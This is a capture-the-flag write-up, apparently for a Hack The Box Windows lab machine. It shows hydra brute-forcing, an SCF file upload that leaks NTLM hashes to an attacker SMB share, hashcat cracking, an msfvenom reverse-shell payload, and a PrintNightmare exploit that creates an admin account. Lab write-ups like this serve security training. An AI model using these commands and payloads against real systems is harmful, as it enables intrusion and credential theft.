## Port 80

### Inspecting with burp

The response header when trying to authenticate gives this (we can also see it in the nmap scan):
```
WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
```
So we get username, we can try to bruteforce with hydra `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.106 http-get`
```

- So we have admin:admin credentials

There is a file upload functionality and it says it will go in the share. It bugged me for a while and then I remember the URL File attack
So I uploaded this file
```
[Shell]
Command=2
IconFile=\\10.10.14.2\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- I named it with and @ at the begining for instance `@csbygb`
- And then we need to launch responder with smb server on obviously `responder -w --lm -v -I tun0`
- And we get hashes!

- Now we just have to crack one of them with hashcat
- We just need to copy a whole one like this `tony::DRIVER:a05acd47ab1ac310:B15097FF39CD452C8F8E53BDC33B7B37:0101000000000000DF515CFA2F5DD801D1688BA244C5025400000000020000000000000000000000`
- And then launch hashcat as follow `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
- And we get the password `liltony`

- Let's see what shares we have
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/Documents/hackthebox/driver]
â””â”€# smbclient -L //10.10.11.106 -U 'tony'                                                                                                                                                                                                1 â¨¯
Enter WORKGROUP\tony's password:

```
- Let's use cracmapexec to see how we could use the creds  
![image](https://user-images.githubusercontent.com/96747355/166128322-f37c77a4-be30-4be1-8291-568e5243a846.png)  
- Let's get a shell with evil-winrm `evil-winrm -i 10.10.11.106 -u tony -p liltony`
- It works! Let's grab our user flag in tony's desktop!

## Privesc

- Let's get winpeas and execute it in our target
- In our kali `wget https://github.com/carlospolop/PEASS-ng/releases/download/20220424/winPEASx64.exe`
- Now we just have to upload it in our target with evilwinrm it really easy we just need to type `upload winPEASx64.exe`
- And we launch it `.\winPEASx64.exe`
- Winpeas shows that there is a powershell history file  
![image](https://user-images.githubusercontent.com/96747355/166128680-3edae579-a4c4-49c1-a595-07f5e3770547.png)  
- If we google the specific driver we have a privesc vuln
- Let's get a shell with msfconsole so that we can privesc using a metasploit module
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o reverse2.exe`
- in our evvilwinrm shell `upload reverse.exe`
- I got annoyed with this exploit because I could not make it work
- I decided to use [printnightmare](../windows/printNightmare.md) instead
  - `wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1`
  - From evil winrm `upload CVE-2021-1675.ps1`
  - `Import-Module .\CVE-2021-1675.ps1`
  - `Get-Command Invoke-Nightmare`
  - `Invoke-Nightmare -NewUser "csbygb" -NewPassword "csbygb123!"`
  - Finally if we net user we see we are in the admin group `net user csbygb`
  - Now we just need to use evil-winrm with our new user `evil-winrm -i 10.10.11.106 -u csbygb -p csbygb123!`
  - And we can grab the admin flag 
  - `cd C:\Users\Administrator\Desktop`
  - `type root.txt`
